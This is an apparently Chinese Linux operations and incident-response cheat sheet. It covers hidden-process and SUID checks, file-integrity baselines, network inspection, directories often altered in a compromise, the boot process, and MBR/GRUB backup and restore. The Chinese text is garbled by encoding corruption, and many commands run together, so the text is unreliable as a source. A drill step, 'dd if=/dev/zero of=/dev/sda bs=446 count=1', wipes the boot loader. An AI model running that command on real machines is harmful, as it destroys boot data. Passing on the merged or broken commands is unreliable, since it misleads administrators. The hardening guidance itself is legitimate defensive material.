&#x2F;&#x2F;æ‰€æœ‰çš„å®ˆæŠ¤è¿›ç¨‹éƒ½æ˜¯ä»¥è¶…çº§ç”¨æˆ·å¯åŠ¨çš„(UIDä¸º0)ï¼›æ²¡æœ‰æ§åˆ¶ç»ˆç«¯(TTYä¸ºï¼Ÿ)ï¼›ç»ˆç«¯è¿›ç¨‹ç»„IDä¸º-1(TPGIDè¡¨ç¤ºç»ˆç«¯è¿›ç¨‹ç»„IDï¼Œè¯¥å€¼è¡¨ç¤ºä¸æ§åˆ¶ç»ˆç«¯ç›¸å…³çš„å‰å°è¿›ç¨‹ç»„ï¼Œå¦‚æœæœªå’Œä»»ä½•ç»ˆç«¯ç›¸å…³ï¼Œå…¶å€¼ä¸º-1ï¼› å‚æ•°è¯´æ˜ï¼š-a: æ˜¾ç¤ºæ‰€æœ‰-xï¼šæ˜¾ç¤ºæ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹-jï¼šæ˜¾ç¤ºä¸ä½œä¸šæœ‰å…³çš„ä¿¡æ¯ï¼ˆæ˜¾ç¤ºçš„åˆ—ï¼‰ï¼šä¼šè¯æœŸIDï¼ˆSIDï¼‰ï¼Œè¿›ç¨‹ç»„IDï¼ˆPGIDï¼‰ï¼Œæ§åˆ¶ç»ˆç«¯ï¼ˆTTYï¼‰ï¼Œç»ˆç«¯è¿›ç¨‹ç»„IDï¼ˆTRGIDï¼‰7ï¼‰æŸ¥æ‰¾éšè—è¿›ç¨‹ï¼šps -ef|awk â€˜{print }â€™|sort -n|uniq&gt;1ls &#x2F;proc&#x2F;|sort -n|uniq &gt;28ï¼‰æ£€æŸ¥æƒé™è¿‡å¼€æ–‡ä»¶find &#x2F; -uid 0 -perm -4000 -printfind &#x2F; -size +10000k -print &#x2F;&#x2F;æ³¨æ„SUIDæ–‡ä»¶ï¼Œå¯ç–‘å¤§äº10Må’Œç©ºæ ¼æ–‡ä»¶find &#x2F; -name â€œâ€¦â€ -printfind &#x2F; -name â€œ â€œ -printfind &#x2F; -name â€œ.â€ -print9)æ£€æŸ¥ç³»ç»Ÿä¸­çš„coreæ–‡ä»¶find &#x2F; -name core -exec ls -l {} ;10)æ£€æŸ¥ç³»ç»Ÿæ–‡ä»¶å®Œæ•´æ€§rpm -qf &#x2F;bin&#x2F;lsrpm -qf &#x2F;bin&#x2F;loginmd5sum -b å…³é”®æ–‡ä»¶åmd5sum -t å…³é”®æ–‡ä»¶åæ—¥å¸¸è¿ç»´æ—¶ï¼Œå¯å°†ä¸€äº›é‡è¦çš„æ–‡ä»¶çš„md5å€¼ä¿å­˜ï¼Œä½œä¸ºä¹‹åå˜åŒ–çš„å‚ç…§ #!&#x2F;bin&#x2F;bashexport path&#x3D;$PATH:&#x2F;rootmd5sum &#x2F;etc&#x2F;passwd &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;etc&#x2F;shadow &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;etc&#x2F;group &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;usr&#x2F;bin&#x2F;passwd &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;sbin&#x2F;portmap&gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;bin&#x2F;login &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;bin&#x2F;ls &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;bin&#x2F;ps &gt;&gt;&#x2F;etc&#x2F;md5dbmd5sum &#x2F;usr&#x2F;bin&#x2F;top &gt;&gt;&#x2F;etc&#x2F;md5db123456789101111ï¼‰æ£€æŸ¥RPMï¼šrpm -Va &#x2F;&#x2F;åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­å®‰è£…åï¼Œæ‰€æœ‰å˜åŒ–è¿‡çš„åŒ…æ–‡ä»¶ï¼Œå¯ä»¥ä»¥æ­¤æ¥æ£€æŸ¥æ–‡ä»¶åŒ…çš„å®Œæ•´æ€§ï¼Œå®‰å…¨æ€§ç­‰å…¶ä¸­ï¼šS â€“ File sizeM â€“ Modeä¸åŒæƒé™5 â€“ MD5 sumD â€“ Device number cè¡¨ç¤ºæ–‡ä»¶ä¸ºé…ç½®æ–‡ä»¶ã€‚å…¶ä»–æ ‡å¿—æœ‰ï¼š d %doc è¯´æ˜æ–‡æ¡£ï¼›g %ghost ä¸åº”åŒ…å«çš„æ–‡æ¡£ï¼Œæœ‰å¯èƒ½æœ‰é—®é¢˜ï¼›l %license æˆæƒæ–‡ä»¶ï¼›r %readme readmeè¯´æ˜æ–‡ä»¶ã€‚ æ³¨æ„ç›¸å…³çš„ &#x2F;sbin, &#x2F;bin, &#x2F;usr&#x2F;sbin, and &#x2F;usr&#x2F;bin 12)æ£€æŸ¥æ–‡ä»¶çš„å˜åŒ–ï¼š ls -Xal â€“time-style&#x3D;+%D | grep â€˜date +%Dâ€™ &#x2F;&#x2F;åªåˆ—å‡ºå½“å‰ç›®å½•å½“å¤©ä¿®æ”¹çš„æ–‡ä»¶ï¼Œ-X æ ‡å¿—æ¥æŒ‰å­—æ¯é¡ºåºå¯¹ç»“æœæ’åºï¼Œ-S æ ‡å¿—æ¥åŸºäºå¤§å°ï¼ˆç”±å¤§åˆ°å°ï¼‰æ¥æ’åºfind . -maxdepth 1 -newermt â€œ2020-09-13â€find . -maxdepth 1 -newermt â€œ09&#x2F;13&#x2F;2020â€æˆ–è€…# find . -maxdepth 1 -newermt â€œ2020&#x2F;09&#x2F;13â€ 13ï¼‰æŸ¥çœ‹ç½‘ç»œè¿æ¥ netstat -atlpv &#x2F;&#x2F;çœ‹æ­£åœ¨ç½‘ç»œé€šè®¯çš„è¿›ç¨‹å’Œsocketè¿æ¥çŠ¶æ€ iftop &#x2F;&#x2F;çœ‹æ´»è·ƒçš„ç½‘ç»œé€šè®¯ä»¥åŠæµé‡ æŠ“åŒ…åˆ†æï¼štcpdump -w tcpdump.log &#x2F;&#x2F;å°†tcpdump.logä¿å­˜æˆ pcap æ ¼å¼å¯¼å…¥åˆ° wiresharktcpdump -c 10000 -i eth0 -n dst port 80 &gt; &#x2F;root&#x2F;pkts æŸ¥çœ‹httpçš„å¹¶å‘è¯·æ±‚æ•°åŠå…¶TCPè¿æ¥çŠ¶æ€ï¼šnetstat -n | awk â€˜&#x2F;^tcp&#x2F; {++S[$NF]} END {for(a in S) print a, S[a]}â€™ æŸ¥çœ‹cacheé‡Œçš„URLgrep -r -a jpg &#x2F;var&#x2F;cache&#x2F;* | strings | grep â€œhttp:â€ | awk -Fâ€™http:â€™ â€˜{print â€œhttp:â€$2;}â€™ æŸ¥çœ‹ç½‘ç»œè´Ÿè½½ï¼š # sar -n DEV &#x2F;&#x2F;æ£€æŸ¥ç½‘ç»œæµé‡(rxbyt&#x2F;s, txbyt&#x2F;s)æ˜¯å¦è¿‡é«˜ç½‘ç»œé”™è¯¯ # netstat -i &#x2F;&#x2F;æ£€æŸ¥æ˜¯å¦æœ‰ç½‘ç»œé”™è¯¯(drop fifo colls carrier) ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤ï¼š# cat &#x2F;proc&#x2F;net&#x2F;dev 14ï¼‰æ–‡ä»¶è¢«é»‘çš„å¸¸è§å½¢å¼ï¼š&#x2F;bin ï¼ˆæ›¿æ¢åŸºæœ¬å·¥å…·ä¸ºæ¶æ„æœ¨é©¬ç­‰ï¼Œæ¯”å¦‚netstatï¼Œpsç­‰ï¼‰&#x2F;sbin ï¼ˆæ›¿æ¢åŸºæœ¬å·¥å…·ä¸ºæ¶æ„æœ¨é©¬ç­‰ï¼Œæ¯”å¦‚sshdï¼Œlsofï¼Œssç­‰ï¼‰&#x2F;usr&#x2F;binï¼ˆæ›¿æ¢åŸºæœ¬å·¥å…·ä¸ºæ¶æ„æœ¨é©¬ç­‰ï¼Œæ¯”å¦‚sshdï¼Œlsofï¼Œssç­‰ï¼‰&#x2F;usr&#x2F;sbin ï¼ˆæ›¿æ¢åŸºæœ¬å·¥å…·ä¸ºæ¶æ„æœ¨é©¬ç­‰ï¼Œæ¯”å¦‚sshdï¼Œlsofï¼Œssç­‰ï¼‰&#x2F;etc&#x2F;init.d ï¼ˆä¿®æ”¹å¼€æœºå¯åŠ¨ä»»åŠ¡ï¼Œæ·»åŠ æ¶æ„è„šæœ¬å¼€æœºå¯åŠ¨ï¼‰&#x2F;etc&#x2F;&#x2F;etc&#x2F;cront.d ï¼ˆä¿®æ”¹è®¡åˆ’ä»»åŠ¡ï¼Œæ·»åŠ æ¶æ„è„šæœ¬å®šæ—¶æ‰§è¡Œï¼‰&#x2F;etc&#x2F;crontab ï¼ˆä¿®æ”¹è®¡åˆ’ä»»åŠ¡ï¼Œæ·»åŠ æ¶æ„è„šæœ¬å®šæ—¶æ‰§è¡Œï¼‰~&#x2F;.ssh&#x2F;ç›®å½• (æ³¨å…¥å…¬é’¥)&#x2F;etc&#x2F;sysconfig ï¼ˆä¿®æ”¹iptablesé…ç½®ç­‰ï¼Œå¼€æ”¾ç½‘ç»œé™åˆ¶ï¼‰&#x2F;etc&#x2F;ssh&#x2F; ï¼ˆä¿®æ”¹sshé…ç½®ï¼‰webç›®å½• ï¼ˆä¿®æ”¹ç½‘ç«™ï¼‰éœ€å®šæ—¶æ£€æŸ¥ä¸Šè¿°ç›®å½•ä¸‹æ–‡ä»¶è¢«æ›¿æ¢æˆ–è€…æ·»åŠ éæ³•æ–‡ä»¶ã€‚ #find &#x2F;usr&#x2F;bin -m -1 &#x2F;&#x2F;æŸ¥çœ‹ä¸€å¤©å†…&#x2F;usr&#x2F;binç›®å½•ä¸‹å˜åŒ–è¿‡çš„æ–‡ä»¶#find &#x2F;var -type f -mtime -1 -exec ls -al {} ; 15ï¼‰æ€æ‰è¿›ç¨‹ç¤ºä¾‹å¦‚ä¸‹ï¼šps aux |grep p_name |grep -v grep |awk â€˜{print $2}â€™ |xargs kill -9 (ä»ä¸­äº†è§£åˆ°awkçš„ç”¨é€”)killall -TERM æœåŠ¡åkill -9 cat &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;logs&#x2F;httpd.pid è¯•è¯•æŸ¥æ€è¿›ç¨‹PID16ï¼‰æ˜¾ç¤ºè¿è¡Œ3çº§åˆ«å¼€å¯çš„æœåŠ¡ls &#x2F;etc&#x2F;rc3.d&#x2F;S* |cut -c 15- &#x2F;&#x2F;æ³¨æ„cutæˆªå–å­—ç¬¦17ï¼‰.æ‰“å¼€æ–‡ä»¶æ•°ç›® # lsof | wc -l &#x2F;&#x2F;æ£€æŸ¥æ‰“å¼€æ–‡ä»¶æ€»æ•°æ˜¯å¦è¿‡å¤š cã€ç³»ç»Ÿå¯åŠ¨å¼‚å¸¸å¤„ç†åŠå¤‡ä»½1&gt;Linuxç³»ç»Ÿå¯åŠ¨å¼•åˆ°è¿‡ç¨‹ï¼ˆBRGKiï¼‰ â—å¼€æœºè‡ªæ£€ï¼šæ£€æµ‹å‡ºç¬¬ä¸€ä¸ªèƒ½å¤Ÿå¼•å¯¼ç³»ç»Ÿçš„è®¾å¤‡ï¼Œæ¯”å¦‚ç¡¬ç›˜æˆ–è€…å…‰é©±ã€‚æœåŠ¡å™¨ä¸»æœºå¼€æœºä»¥åï¼Œå°†æ ¹æ®ä¸»æ¿BIOSä¸­çš„è®¾ç½®å¯¹CPUã€å†…å­˜ã€æ˜¾å¡ã€é”®ç›˜ç­‰ç¡¬ä»¶è®¾å¤‡è¿›è¡Œåˆæ­¥æ£€æµ‹ï¼Œæ£€æµ‹æˆåŠŸåæ ¹æ®é¢„è®¾çš„å¯åŠ¨é¡ºåºç§»äº¤ç³»ç»Ÿæ§åˆ¶æƒï¼Œå¤§å¤šæ—¶å€™ä¼šç§»äº¤ç»™æœ¬æœºç¡¬ç›˜ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿä¸€èˆ¬éƒ½æ˜¯è£…åœ¨ç¡¬ç›˜å†…ã€‚â—MBR å¼•å¯¼ï¼šè¿è¡Œæ”¾åœ¨MBRæ‰‡åŒºé‡Œçš„å¯åŠ¨GRUBå¼•å¯¼ç¨‹åºã€‚å½“ä»æœ¬æœºç¡¬ç›˜ä¸­å¯åŠ¨ç³»ç»Ÿæ—¶ï¼Œé¦–å…ˆæ ¹æ®ç¡¬ç›˜ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸­MBRï¼ˆä¸»å¼•å¯¼è®°å½•ï¼‰çš„è®¾ç½®ï¼Œå°†ç³»ç»Ÿæ§åˆ¶æƒä¼ é€’ç»™åŒ…å«æ“ä½œç³»ç»Ÿå¼•å¯¼æ–‡ä»¶çš„åˆ†åŒºï¼›æˆ–è€…ç›´æ¥æ ¹æ®MBRè®°å½•ä¸­çš„å¼•å¯¼ä¿¡æ¯è°ƒç”¨å¯åŠ¨èœå•ã€‚ä¾‹å¦‚ï¼šGRUBç­‰â—GRUB èœå•ï¼šGRUBå¼•å¯¼ç¨‹åºé€šè¿‡è¯»å–GRUBé…ç½®æ–‡ä»¶**&#x2F;boot&#x2F;grub2&#x2F;grub.cfg**ï¼Œæ¥è·å–å†…æ ¸å’Œé•œåƒæ–‡ä»¶ç³»ç»Ÿçš„è®¾ç½®ä»¥åŠè·¯å¾„ä½ç½®ã€‚å¯¹äºLinuxæ“ä½œç³»ç»Ÿæ¥è¯´ï¼ŒGRUBï¼ˆç»Ÿä¸€å¯åŠ¨åŠ è½½å™¨ï¼‰æ˜¯ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„å¤šç³»ç»Ÿå¼•å¯¼å™¨ç¨‹åºï¼Œç³»ç»Ÿæ§åˆ¶æƒä¼ é€’ç»™GRUBä»¥åï¼Œå°†ä¼šæ˜¾ç¤ºå¯åŠ¨èœå•ç»™ç”¨æˆ·é€‰æ‹©ï¼Œå¹¶æ ¹æ®æ‰€é€‰é¡¹ï¼ˆæˆ–é‡‡ç”¨é»˜è®¤å€¼ï¼‰åŠ è½½Linuxå†…æ ¸æ–‡ä»¶ï¼Œç„¶åå°†ç³»ç»Ÿæ§åˆ¶æƒè½¬äº¤ç»™å†…æ ¸ã€‚ï¼ˆCentOS 7é‡‡ç”¨çš„æ˜¯GRUB2å¯åŠ¨å¼•å¯¼å™¨ï¼‰â—åŠ è½½Linuxå†…æ ¸ï¼šæŠŠå†…æ ¸å’Œé•œåƒæ–‡ä»¶ç³»ç»ŸåŠ è½½åˆ°å†…å­˜ä¸­ã€‚Linuxå†…æ ¸æ˜¯ä¸€ä¸ªé¢„å…ˆç¼–è¯‘å¥½çš„ç‰¹æ®ŠäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»‹äºå„è‡ªç¡¬ä»¶èµ„æºä¸ç³»ç»Ÿç¨‹åºä¹‹é—´ï¼Œå¤åˆ¶èµ„æºåˆ†é…ä¸è°ƒåº¦ï¼Œå†…æ ¸æ¥è¿‡ç³»ç»Ÿæ§åˆ¶æƒä»¥åï¼Œå°†å®Œå…¨æŒæ§æ•´ä¸ªLinuxæ“ä½œç³»ç»Ÿçš„è¿è¡Œè¿‡ç¨‹ã€‚ï¼ˆCentOS 7ç³»ç»Ÿä¸­ï¼Œé»˜è®¤çš„å†…æ ¸æ–‡ä»¶ä½äºâ€œ&#x2F;boot&#x2F;vmlinuz-3.10.0-514.e17.x86_64â€ï¼‰â—init è¿›ç¨‹åˆå§‹åŒ–ï¼šåŠ è½½ç¡¬ä»¶é©±åŠ¨ç¨‹åºï¼Œå†…æ ¸æŠŠinitè¿›ç¨‹åŠ è½½åˆ°å†…å­˜ä¸­è¿è¡Œã€‚ä¸ºäº†å®Œæˆè¿›ä¸€æ­¥çš„ç³»ç»Ÿå¼•å¯¼è¿‡ç¨‹ï¼ŒLinuxå†…æ ¸é¦–å…ˆå°†ç³»ç»Ÿä¸­çš„â€œ&#x2F;sbin&#x2F;initâ€ç¨‹åºåŠ è½½åˆ°å†…å­˜ä¸­è¿è¡Œï¼ˆè¿è¡Œä¸­çš„ç¨‹åºç§°ä¸ºè¿›ç¨‹ï¼‰ï¼Œinitè¿›ç¨‹ï¼ˆsystemdï¼‰è´Ÿè´£å®Œæˆæ•´ä¸ªç³»ç»Ÿçš„åˆå§‹åŒ–ï¼Œæœ€åç­‰å¾…ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚ 2&gt; ä¸ºé¿å…å› å¼•å¯¼æ‰‡åŒºçš„æŸåæˆ–ä¸¢å¤±å¯¼è‡´ç³»ç»Ÿæ— æ³•å¯åŠ¨ï¼Œéœ€æå‰å¤‡ä»½MBRæ‰‡åŒºä¿¡æ¯ MBRä½äºç¬¬ä¸€å—ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªç‰©ç†æ‰‡åŒºå¤„ï¼Œæ€»å…±512å­—èŠ‚ï¼›æ•…æˆ‘ä»¬å¯ä½¿ç”¨ddå‘½ä»¤å°†MBRæ‰€åœ¨ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ª512å­—èŠ‚çš„å—ä¿å­˜å³å¯ï¼Œå‡è®¾MBRåœ¨sdaï¼ˆç¬¬ä¸€å—ç¡¬ç›˜ä¸Šï¼‰ï¼Œåˆ›å»ºçš„å¤‡ä»½ç›®å½•ä¸ºsdbä¸Šçš„&#x2F;mbrbak&#x2F;,æ‰§è¡Œå‘½ä»¤ï¼š å¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¨¡å¼æŸåMBRå—åŒºï¼š æ¢å¤æ—¶ï¼Œé‡å¯ç³»ç»Ÿï¼Œä½¿ç”¨æ•‘æ´æ¨¡å¼ï¼Œç”¨ddå‘½ä»¤å°†MBRå¤‡ä»½å†™å›ç³»ç»ŸMBRç¬¬ä¸€ä¸ªæ‰‡åŒºå³å¯ï¼š 3&gt;Grubå¼•åˆ°ç¨‹åºå¼‚å¸¸å¯¼è‡´çš„ç³»ç»Ÿå¯åŠ¨å¤±è´¥ æ¯”å¦‚ï¼šMBRä¸­çš„GRUBå¼•å¯¼ç¨‹åºï¼ˆ1-446å­—èŠ‚ï¼‰é­åˆ°ç ´åï¼›æˆ–grub.cfgæ–‡ä»¶ä¸¢å¤±ï¼Œå¼•å¯¼é…ç½®æœ‰è¯¯ï¼Œæ–‡ä»¶ä½ç½®&#x2F;boot&#x2F;grub2&#x2F;grup.cfgã€‚ æ•…éšœç°è±¡ï¼šç³»ç»Ÿå¼•å¯¼å¡æ­»åˆ°grub &gt;æç¤ºç¬¦ï¼Œæ— æ³•ç»§ç»­è¿›å…¥ è§£å†³æ€è·¯ï¼š 1.å°è¯•æ‰‹åŠ¨è¾“å…¥å¼•å¯¼å‘½ä»¤ä¿®å¤ï¼ˆä¸æ¨èï¼‰ grub&gt; insmod xfsgrub&gt; linux16 &#x2F;vmlinuz-0-rescue-73d7ede256a74b0e975e69f22d862090 root&#x3D;UUID&#x3D;d069b243-6623-4983-8d61-3ec6956a4f2b ro rhgb quietgrub&gt; initrd16 &#x2F;initramfs-0-rescue-73d7ede256a74b0e975e69f22d862090.imggrub&gt; boot12342.è¿›å…¥æ€¥æ•‘æ¨¡å¼ï¼Œé‡å†™æˆ–è€…ä»å¤‡ä»½ä¸­æ¢å¤grub.cfg ç„¶åæŒ‚è½½ç³»ç»ŸCDç›˜ï¼Œä»CDç›˜æ¢å¤GRUBæ•°æ®ã€‚ 3.æ€¥æ•‘æ¨¡å¼å‘MBRæ‰‡åŒºä¸­é‡å»ºgrubç¨‹åºMBRä½äºç¬¬ä¸€å—ç¡¬ç›˜( &#x2F;dev&#x2F;sda)çš„ç¬¬ä¸€ä¸ªç‰©ç†æ‰‡åŒºå¤„ï¼Œæ€»å…±512å­—èŠ‚ï¼Œ å‰446å­—èŠ‚æ˜¯ä¸»å¼•å¯¼è®°å½•ï¼Œåˆ†åŒºè¡¨ä¿å­˜åœ¨MBRæ‰‡åŒºä¸­çš„ç¬¬447-510å­—èŠ‚ä¸­ã€‚ä¿®å¤æ–¹æ³•è·ŸMBRåŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯å¤‡ä»½çš„æ•°æ®åªéœ€è¦446å­—èŠ‚å°±å¯ä»¥ï¼Œå°†bs&#x3D;512ä¿®æ”¹ä¸ºbs&#x3D;446å³å¯ã€‚è¿‡ç¨‹å¦‚ä¸‹ï¼š aã€åˆ›å»ºæ–°ç›®å½•ç”¨ä»¥æŒ‚è½½å¤‡ä»½ç£ç›˜ï¼Œå¤‡ä»½GRUBå¼•å¯¼ç¨‹åº#mkdir &#x2F;bak#mount &#x2F;dev&#x2F;sdb1 &#x2F;bak&#x2F;#dd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;bak&#x2F;grup.bak bs&#x3D;446 count&#x3D;1 bã€æ¨¡æ‹Ÿå¯¹MBRä¸­çš„GRUBå¼•å¯¼ç¨‹åºçš„ç ´åï¼Œä½†ä¸ç ´ååˆ†åŒºè¡¨#dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;&#x2F;dev&#x2F;sda bs&#x3D;446 count&#x3D;1 cã€å¼•å¯¼ç•Œé¢è¿›å…¥æ€¥æ•‘æ¨¡å¼ï¼Œä»å¤‡ä»½æ–‡ä»¶ä¸­æ¢å¤GRUBå¼•å¯¼ç¨‹åºsh-4.2# mkdir &#x2F;backupdirsh-4.2# mount &#x2F;dev&#x2F;sdb1 &#x2F;backupdirsh-4.2# dd if&#x3D;backupdir&#x2F;grup.bak of&#x3D;&#x2F;dev&#x2F;sda bs&#x3D;446 count&#x3D;1sh-4.2# exit é™„å½•ï¼šç³»ç»Ÿå¯åŠ¨æ—¶æœåŠ¡è‡ªå¯åŠ¨ç®¡ç†å·¥å…·ntsysv ntsysvå‘½ä»¤æä¾›äº†ä¸€ä¸ªåŸºäºæ–‡æœ¬ç•Œé¢çš„èœå•æ“ä½œæ–¹å¼ï¼Œé›†ä¸­ç®¡ç†ç³»ç»Ÿä¸åŒçš„è¿è¡Œç­‰çº§ä¸‹çš„ç³»ç»ŸæœåŠ¡å¯åŠ¨çŠ¶æ€ã€‚åœ¨RedHatå„ä¸ªå‘è¡Œç‰ˆï¼ŒCentOSå„ä¸ªç‰ˆæœ¬ï¼Œéƒ½è‡ªå¸¦è¿™ä¸ªå·¥å…·ã€‚å®ƒå…·æœ‰äº’åŠ¨å¼æ“ä½œç•Œé¢ï¼Œæ‚¨å¯ä»¥è½»æ˜“åœ°åˆ©ç”¨æ–¹å‘é”®å’Œç©ºæ ¼é”®ç­‰ï¼Œå¼€å¯ï¼Œå…³é—­æ“ä½œç³»ç»Ÿåœ¨æ¯ä¸ªæ‰§è¡Œç­‰çº§ä¸­ï¼Œæ‰€è¦æ‰§è¡Œçš„ç³»ç»ŸæœåŠ¡ã€‚ è¾“å…¥ntsysvå‘½ä»¤åï¼Œå‡ºç°ä¸€ä¸ªäº¤äº’å¼çš„ç®¡ç†èœå•ï¼Œå¦‚ä¸‹ï¼š å¤‡ä»½dump -0aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home åˆ¶ä½œä¸€ä¸ª â€˜&#x2F;homeâ€™ ç›®å½•çš„å®Œæ•´å¤‡ä»½dump -1aj -f &#x2F;tmp&#x2F;home0.bak &#x2F;home åˆ¶ä½œä¸€ä¸ª â€˜&#x2F;homeâ€™ ç›®å½•çš„äº¤äº’å¼å¤‡ä»½restore -if &#x2F;tmp&#x2F;home0.bak è¿˜åŸä¸€ä¸ªäº¤äº’å¼å¤‡ä»½rsync -rogpav â€“delete &#x2F;home &#x2F;tmp åŒæ­¥ä¸¤è¾¹çš„ç›®å½•rsync -rogpav -e ssh â€“delete &#x2F;home ip_address:&#x2F;tmp é€šè¿‡SSHé€šé“rsyncrsync -az -e ssh â€“delete ip_addr:&#x2F;home&#x2F;public &#x2F;home&#x2F;local é€šè¿‡sshå’Œå‹ç¼©å°†ä¸€ä¸ªè¿œç¨‹ç›®å½•åŒæ­¥åˆ°æœ¬åœ°ç›®å½•rsync -az -e ssh â€“delete &#x2F;home&#x2F;local ip_addr:&#x2F;home&#x2F;public é€šè¿‡sshå’Œå‹ç¼©å°†æœ¬åœ°ç›®å½•åŒæ­¥åˆ°è¿œç¨‹ç›®å½•dd bs&#x3D;1M if&#x3D;&#x2F;dev&#x2F;hda | gzip | ssh user@ip_addr â€˜dd of&#x3D;hda.gzâ€™ é€šè¿‡sshåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä¸€æ¬¡å¤‡ä»½æœ¬åœ°ç£ç›˜çš„æ“ä½œdd if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;tmp&#x2F;file1 å¤‡ä»½ç£ç›˜å†…å®¹åˆ°ä¸€ä¸ªæ–‡ä»¶tar -Puf backup.tar &#x2F;home&#x2F;user æ‰§è¡Œä¸€æ¬¡å¯¹ â€˜&#x2F;home&#x2F;userâ€™ ç›®å½•çš„äº¤äº’å¼å¤‡ä»½æ“ä½œ( cd &#x2F;tmp&#x2F;local&#x2F; &amp;&amp; tar c . ) | ssh -C user@ip_addr â€˜cd &#x2F;home&#x2F;share&#x2F; &amp;&amp; tar x -pâ€™ é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªç›®å½•å†…å®¹( tar c &#x2F;home ) | ssh -C user@ip_addr â€˜cd &#x2F;home&#x2F;backup-home &amp;&amp; tar x -pâ€™ é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªæœ¬åœ°ç›®å½•tar cf - . | (cd &#x2F;tmp&#x2F;backup ; tar xf - ) æœ¬åœ°å°†ä¸€ä¸ªç›®å½•å¤åˆ¶åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œä¿ç•™åŸæœ‰æƒé™åŠé“¾æ¥find &#x2F;home&#x2F;user1 -name â€˜.txtâ€™ | xargs cp -av â€“target-directory&#x3D;&#x2F;home&#x2F;backup&#x2F; â€“parents ä»ä¸€ä¸ªç›®å½•æŸ¥æ‰¾å¹¶å¤åˆ¶æ‰€æœ‰ä»¥ â€˜.txtâ€™ ç»“å°¾çš„æ–‡ä»¶åˆ°å¦ä¸€ä¸ªç›®å½•find &#x2F;var&#x2F;log -name â€˜.logâ€™ | tar cv â€“files-from&#x3D;- | bzip2 &gt; log.tar.bz2 æŸ¥æ‰¾æ‰€æœ‰ä»¥ â€˜.logâ€™ ç»“å°¾çš„æ–‡ä»¶å¹¶åšæˆä¸€ä¸ªbzipåŒ…dd if&#x3D;&#x2F;dev&#x2F;hda of&#x3D;&#x2F;dev&#x2F;fd0 bs&#x3D;512 count&#x3D;1 åšä¸€ä¸ªå°† MBR (Master Boot Record)å†…å®¹å¤åˆ¶åˆ°è½¯ç›˜çš„åŠ¨ä½œdd if&#x3D;&#x2F;dev&#x2F;fd0 of&#x3D;&#x2F;dev&#x2F;hda bs&#x3D;512 count&#x3D;1 ä»å·²ç»ä¿å­˜åˆ°è½¯ç›˜çš„å¤‡ä»½ä¸­æ¢å¤MBRå†…å®¹ 15ã€Linuxè¿ç»´å·¥å…·åŠæŠ€å·§1ï¼‰15 ä¸ªè¶…èµçš„ Linux å·¥å…·Aã€æ¯”grepã€ackæ›´å¿«çš„é€’å½’æœç´¢æ–‡ä»¶å†…å®¹å·¥å…·ag ï¼š Bã€tig å‘½ä»¤ï¼šå­—ç¬¦æ¨¡å¼ä¸‹äº¤äº’æŸ¥çœ‹gité¡¹ç›®ï¼Œå¯ä»¥æ›¿ä»£gitå‘½ä»¤ã€‚ Cã€mycli ï¼šmysqlå®¢æˆ·ç«¯ï¼Œæ”¯æŒè¯­æ³•é«˜äº®å’Œå‘½ä»¤è¡¥å…¨ï¼Œæ•ˆæœç±»ä¼¼ipythonï¼Œå¯ä»¥æ›¿ä»£mysqlå‘½ä»¤ã€‚ Dã€jq : jsonæ–‡ä»¶å¤„ç†ä»¥åŠæ ¼å¼åŒ–æ˜¾ç¤ºï¼Œæ”¯æŒé«˜äº®ï¼Œå¯ä»¥æ›¿æ¢python -m json.toolã€‚ Eã€shellcheck ï¼š shellè„šæœ¬é™æ€æ£€æŸ¥å·¥å…·ï¼Œèƒ½å¤Ÿè¯†åˆ«è¯­æ³•é”™è¯¯ä»¥åŠä¸è§„èŒƒçš„å†™æ³•ã€‚ Fã€ã€fzf ï¼šå‘½ä»¤è¡Œä¸‹æ¨¡ç³Šæœç´¢å·¥å…·ï¼Œèƒ½å¤Ÿäº¤äº’å¼æ™ºèƒ½æœç´¢å¹¶é€‰å–æ–‡ä»¶æˆ–è€…å†…å®¹ï¼Œé…åˆç»ˆç«¯ctrl-rå†å²å‘½ä»¤æœç´¢ç®€ç›´å®Œç¾ã€‚ Gã€PathPicker(fpp) : åœ¨å‘½ä»¤è¡Œè¾“å‡ºä¸­è‡ªåŠ¨è¯†åˆ«ç›®å½•å’Œæ–‡ä»¶ï¼Œæ”¯æŒäº¤äº’å¼ï¼Œé…åˆgitéå¸¸æœ‰ç”¨ã€‚eg1ï¼šgit diff HEAD~8 â€“stat | fpp Hã€htop : æä¾›æ›´ç¾è§‚ã€æ›´æ–¹ä¾¿çš„è¿›ç¨‹ç›‘æ§å·¥å…·ï¼Œæ›¿ä»£topå‘½ä»¤ã€‚è€Œglances ï¼šæ›´å¼ºå¤§çš„ htop &#x2F; top ä»£æ›¿è€…ã€‚ ä¸‹å›¾ä¸ºglancesçš„ï¼š Iã€axel ï¼š å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·ï¼Œä¸‹è½½æ–‡ä»¶æ—¶å¯ä»¥æ›¿ä»£curlã€wgetã€‚egï¼šaxel -n 20 